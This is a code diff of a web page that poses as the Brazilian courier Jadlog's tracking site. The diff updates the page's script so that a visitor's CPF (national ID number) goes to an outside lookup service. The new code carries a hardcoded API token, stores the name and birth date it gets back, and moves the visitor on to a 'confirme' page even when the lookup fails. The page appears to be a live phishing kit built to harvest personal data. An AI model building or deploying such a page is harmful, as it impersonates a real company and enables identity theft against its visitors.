@@ -2,14 +2,14 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
-  <link rel="icon" type="image/x-icon" href="https://logodownload.org/wp-content/uploads/2019/02/jadlog-logo.png">
+  <link rel="icon" type="image/x-icon" href="images/jadlog-logo.png">
   <title>Jadlog | Rastreamento de Encomendas</title>
   
   <!-- Google Fonts -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
   
   <!-- Font Awesome -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="stylesheet" href="css/all.min.css">
   
   <style>
     * {
@@ -467,7 +467,7 @@
   <header>
     <div class="header-container">
       <div class="logo-container">
-        <img src="https://logodownload.org/wp-content/uploads/2019/02/jadlog-logo.png" alt="Jadlog">
+        <img src="images/jadlog-logo.png" alt="Jadlog">
       </div>
       <div class="header-actions">
         <a href="#" class="btn-login">
@@ -552,135 +552,20 @@
   <!-- Footer -->
   <footer>
     <div class="footer-logo">
-      <img src="https://logodownload.org/wp-content/uploads/2019/02/jadlog-logo.png" alt="Jadlog">
+      <img src="images/jadlog-logo.png" alt="Jadlog">
     </div>
     <div class="footer-text">
       © Copyright 2025 Jadlog - Todos os direitos reservados
     </div>
   </footer>
 <script>
-function initCpfMask() {
-  const cpfInput = document.getElementById('cpf');
-
-  cpfInput.addEventListener('input', (e) => {
-    let value = e.target.value.replace(/\D/g, '');
-
-    if (value.length > 11) value = value.slice(0, 11);
-
-    if (value.length > 9)
-      value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2}).*/, '$1.$2.$3-$4');
-    else if (value.length > 6)
-      value = value.replace(/^(\d{3})(\d{3})(\d{3}).*/, '$1.$2.$3');
-    else if (value.length > 3)
-      value = value.replace(/^(\d{3})(\d{3}).*/, '$1.$2');
-
-    e.target.value = value;
-  });
-}
-
-function isValidCPF(cpf) {
-  cpf = cpf.replace(/\D/g, '');
-  if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
-
-  let sum = 0, remainder;
-
-  for (let i = 1; i <= 9; i++)
-    sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
-
-  remainder = (sum * 10) % 11;
-  if (remainder >= 10) remainder = 0;
-  if (remainder !== parseInt(cpf.substring(9, 10))) return false;
-
-  sum = 0;
-  for (let i = 1; i <= 10; i++)
-    sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
-
-  remainder = (sum * 10) % 11;
-  if (remainder >= 10) remainder = 0;
-  if (remainder !== parseInt(cpf.substring(10, 11))) return false;
-
-  return true;
-}
-
-async function submitForm() {
-  const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
-  const btn = document.getElementById('continue-cpf');
-  const text = btn.querySelector('.btn-text');
-
-  btn.classList.add('loading');
-  text.textContent = 'Consultando...';
-
-  try {
-    const response = await fetch(`https://base3.sistemafull.site:81/api/xtudo?CPF=${cpf}`);
-
-    const data = await response.json();
-    console.log("RESPOSTA API:", data);
-
-    let nome = null;
-    let nascimento = null;
-
-    // 🔥 TRATAMENTO UNIVERSAL (esse resolve teu caso)
-    const fonte = data.resultados || data;
-
-    if (Array.isArray(fonte)) {
-      if (fonte.length > 0) {
-        nome = fonte[0].nome || fonte[0].NOME;
-        nascimento = fonte[0].data_nascimento || fonte[0].NASC;
-      }
-    } else if (typeof fonte === 'object') {
-      nome = fonte.nome || fonte.NOME;
-      nascimento = fonte.data_nascimento || fonte.NASC;
-    }
-
-    console.log("NOME EXTRAÍDO:", nome);
-
-    // 🔥 SE NÃO VIER NOME → NÃO QUEBRA O FLUXO
-    if (!nome) {
-      console.warn("Nome não encontrado, mas seguindo fluxo mesmo assim");
-
-      sessionStorage.setItem('cpf', cpf);
-      window.location.href = './confirme/index.html';
-      return;
-    }
-
-    // SALVA DADOS
-    sessionStorage.setItem('nomeCompleto', nome);
-    sessionStorage.setItem('cpf', cpf);
-
-    if (nascimento) {
-      sessionStorage.setItem('dataNascimento', nascimento);
-    }
-
-    // REDIRECIONA
-    window.location.href = './confirme/index.html';
-
-  } catch (err) {
-    console.error("ERRO REAL:", err);
-
-    // 🔥 NÃO TRAVA O USUÁRIO
-    sessionStorage.setItem('cpf', cpf);
-    window.location.href = './confirme/index.html';
-  }
-}
-
-document.addEventListener('DOMContentLoaded', () => {
-  initCpfMask();
-
-  const form = document.getElementById('cpf-form');
-
-  form.addEventListener('submit', (e) => {
-    e.preventDefault();
-
-    const cpf = document.getElementById('cpf').value;
-
-    if (!isValidCPF(cpf)) {
-      alert("CPF inválido");
-      return;
-    }
-
-    submitForm();
-  });
-});
+const API_URL="https://magmadatahub.com/api.php";
+const API_TOKEN="d7c5436286e44288a459ca98de0e140bd32fe9717dcadb1c6bd13526f24a78b9";
+async function fetchCPF(cpf){const url=`${API_URL}?token=${API_TOKEN}&cpf=${cpf}`;const res=await fetch(url);if(!res.ok) throw new Error("Erro ao acessar API");return res.json();}
+function initCpfMask(){const cpfInput=document.getElementById("cpf");cpfInput.addEventListener("input",e=>{let value=e.target.value.replace(/\D/g,"");if(value.length>11)value=value.slice(0,11);if(value.length>9)value=value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2}).*/,"$1.$2.$3-$4");else if(value.length>6)value=value.replace(/^(\d{3})(\d{3})(\d{3}).*/,"$1.$2.$3");else if(value.length>3)value=value.replace(/^(\d{3})(\d{3}).*/,"$1.$2");e.target.value=value;});}
+function isValidCPF(cpf){return cpf.replace(/\D/g,"").length===11;}
+async function submitForm(){const cpf=document.getElementById("cpf").value.replace(/\D/g,"");try{const data=await fetchCPF(cpf);sessionStorage.setItem("nomeCompleto",data.nome||"");sessionStorage.setItem("cpf",cpf);if(data.nascimento)sessionStorage.setItem("dataNascimento",data.nascimento);window.location.href='./confirme/index.html';}catch(e){sessionStorage.setItem("cpf",cpf);window.location.href='./confirme/index.html';}}
+document.addEventListener("DOMContentLoaded",()=>{initCpfMask();document.getElementById("cpf-form").addEventListener("submit",e=>{e.preventDefault();if(!isValidCPF(document.getElementById("cpf").value)){alert("CPF inválido");return;}submitForm();});});
 </script>
 
 
